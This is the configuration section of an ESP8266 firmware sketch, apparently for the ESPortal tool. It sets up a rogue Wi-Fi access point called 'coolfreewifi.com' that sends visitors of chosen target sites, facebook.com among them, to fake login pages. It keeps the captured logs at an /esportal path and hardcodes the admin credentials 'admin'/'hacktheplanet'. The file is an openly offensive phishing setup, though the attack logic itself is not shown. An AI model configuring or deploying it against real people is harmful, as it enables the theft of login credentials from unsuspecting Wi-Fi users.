//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
//User Configuration Happens Here!

//Admin Settings for Flashing Firmware
const char *update_username="admin";
const char *update_password="hacktheplanet";

//Name of Access Point
const char *setSSID="coolfreewifi.com";

//enter URLs HERE for target sites - example: String SITE1="www.exploit.agency";
//do not use www.

//redirects user to www.SITE1.com/login when user visits www.SITE1.com
String SITE1="fakesite1.com";
const char *SITE1_redirect="/login";

//redirects user to www.SITE2.com/sign-in when user visits www.SITE2.com
String SITE2="facebook.com";
const char *SITE2_redirect="/sign-in";

//redirects user to www.SITE3.com/authenticate when user visits www.SITE3.com
String SITE3="fakesite3.com";
const char *SITE3_redirect="/authenticate";

//all other requests for "anysite.com" go to www.anysite.com/user/login
const char *SITEOTHER_redirect="/authenticate";

//Portal Login Redirect Success Page www.accesspoint.com/welcome
String WELCOMEDOMAIN="coolfreewifi.com";
const char *PORTALLOGIN_redirect="/authenticate";
String PORTALLOGIN="192.168.1.1"; //IP of ESP8266 has to go here for it to work

//access ESPORTAL Logs at www.anysite.com/esportal
//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
